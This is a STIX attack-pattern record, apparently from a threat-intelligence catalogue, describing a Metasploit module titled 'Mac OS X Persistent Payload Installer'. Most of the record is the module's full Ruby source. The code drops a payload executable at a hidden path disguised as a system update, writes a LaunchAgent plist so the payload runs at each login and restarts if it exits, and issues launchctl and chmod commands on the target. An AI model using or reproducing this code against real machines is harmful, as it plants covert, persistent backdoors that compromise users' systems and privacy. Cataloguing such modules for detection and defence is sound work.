{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b7fe931-6bf0-43da-bb9b-051c8fe9c84e",
    "created": "2024-08-14T16:34:45.751959Z",
    "modified": "2024-08-14T16:34:45.751964Z",
    "name": "Mac OS X Persistent Payload Installer",
    "description": " This module provides a persistent boot payload by creating a plist entry in current user's ~/Library/LaunchAgents directory. Whenever the user logs in the LaunchAgent will be invoked and this dropped payload will run.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/persistence.rb",
            "external_id": "persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'shellwords'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mac OS X Persistent Payload Installer',\n        'Description' => %q{\n          This module provides a persistent boot payload by creating a plist entry\n          in current user's ~/Library/LaunchAgents directory. Whenever the user logs in,\n          the LaunchAgent will be invoked and this dropped payload will run.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ \"Marcin 'Icewall' Noga <marcin[at]icewall.pl>\", 'joev' ],\n        'Targets' => [\n          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],\n          [ 'Mac OS X x86 (Native Payload for 10.14 and earlier)', { 'Arch' => ARCH_X86, 'Platform' => [ 'osx' ] } ],\n          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],\n          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],\n        ],\n        'DefaultTarget' => 0,\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'DisclosureDate' => '2012-04-01'\n      )\n    )\n\n    register_options([\n      OptString.new('BACKDOOR_PATH',\n        [true, 'Path to hide the backdoor on the target.',\n         '~/Library/.<random>/com.system.update']\n      ),\n      OptBool.new('KEEPALIVE',\n        [true, 'Continually restart the payload exe if it crashes/exits.', true]\n      ),\n      OptBool.new('RUN_NOW',\n        [false, 'Run the installed payload immediately.', false]\n      )\n    ])\n  end\n\n  def exploit\n    check_for_duplicate_entry\n\n    if target['Arch'] == ARCH_PYTHON\n      payload_bin = \"#!/usr/bin/env python\\n\" + payload.encoded\n    elsif target['Arch'] == ARCH_CMD\n      payload_bin = \"#!/usr/bin/env bash\\n\" + payload.raw\n    else\n      payload_bin = generate_payload_exe\n    end\n\n    # Store backdoor on target machine\n    write_backdoor(payload_bin)\n    # Add plist file to LaunchAgents dir\n    add_launchctl_item\n    # tell the user how to remove the persistence if necessary\n    list_removal_paths\n  end\n\n  private\n\n  # drops a LaunchAgent plist into the user's Library, which specifies to run backdoor_path\n  def add_launchctl_item\n    label = File.basename(backdoor_path)\n    cmd_exec(\"mkdir -p #{File.dirname(plist_path).shellescape}\")\n    # Note: the OnDemand key is the OSX < 10.4 equivalent of KeepAlive\n    item = <<-EOI\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n    <plist version=\"1.0\">\n      <dict>\n        <key>Label</key>\n        <string>#{label}</string>\n        <key>Program</key>\n        <string>#{backdoor_path}</string>\n        <key>ProgramArguments</key>\n        <array>\n          <string>#{backdoor_path}</string>\n        </array>\n        <key>RunAtLoad</key>\n        <true/>\n        <key>OnDemand</key>\n        <#{keepalive?}/>\n        <key>KeepAlive</key>\n        <#{keepalive?}/>\n      </dict>\n    </plist>\n    EOI\n\n    if write_file(plist_path, item)\n      print_good(\"LaunchAgent added: #{plist_path}\")\n    else\n      fail_with(Failure::UnexpectedReply, \"Error writing LaunchAgent item to #{plist_path}\")\n    end\n\n    if run_now?\n      cmd_exec(\"launchctl load -w #{plist_path.shellescape}\")\n    end\n\n    print_good('LaunchAgent installed successfully.')\n  end\n\n  # path to upload the backdoor. any <user> or <random> substrings will be replaced.\n  # @return [String] path to drop the backdoor payload.\n  def backdoor_path\n    @backdoor_path ||= (datastore['BACKDOOR_PATH']\n      .gsub('<random>'){ Rex::Text.rand_text_alpha(8) }\n      .gsub(/^~\\//, \"/Users/#{user}/\"))\n  end\n\n  # raises an error if a Launch Agent already exists at desired same plist_path\n  def check_for_duplicate_entry\n    if file?(plist_path)\n      fail_with 'FileError', \"Duplicate LaunchAgent plist already exists at #{plist_path}\"\n    end\n  end\n\n  # @return [Boolean] user wants the persistence to be restarted constantly if it exits\n  def keepalive?\n    datastore['KEEPALIVE']\n  end\n\n  # useful if you want to remove the persistence.\n  # prints out a list of paths to remove and commands to run.\n  def list_removal_paths\n    removal_command = \"rm -rf #{File.dirname(backdoor_path).shellescape}\"\n    removal_command << \" ; rm #{plist_path}\"\n    removal_command << \" ; launchctl remove #{File.basename(backdoor_path)}\"\n    removal_command << \" ; launchctl stop #{File.basename(backdoor_path)}\"\n    print_status(\"To remove the persistence, run:\\n#{removal_command}\\n\")\n  end\n\n  # path to the LaunchAgent service configuration plist\n  # @return [String] path to the LaunchAgent service\n  def plist_path\n    @plist ||= \"/Users/#{user}/Library/LaunchAgents/#{File.basename(backdoor_path)}.plist\"\n  end\n\n  # @return [Boolean] user wants to launch the LaunchAgent immediately\n  def run_now?\n    datastore['RUN_NOW']\n  end\n\n  # @return [String] username of the session\n  def user\n    @user ||= cmd_exec('whoami').strip\n  end\n\n  # drops the file to disk, then makes it executable\n  # @param [String] exe the executable to drop\n  def write_backdoor(exe)\n    print_status('Dropping backdoor executable...')\n    cmd_exec(\"mkdir -p #{File.dirname(backdoor_path).shellescape}\")\n\n    if write_file(backdoor_path, exe)\n      print_good(\"Backdoor stored to #{backdoor_path}\")\n      cmd_exec(\"chmod +x #{backdoor_path.shellescape}\")\n    else\n      fail_with(Failure::UnexpectedReply, \"Error dropping backdoor to #{backdoor_path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-01"
}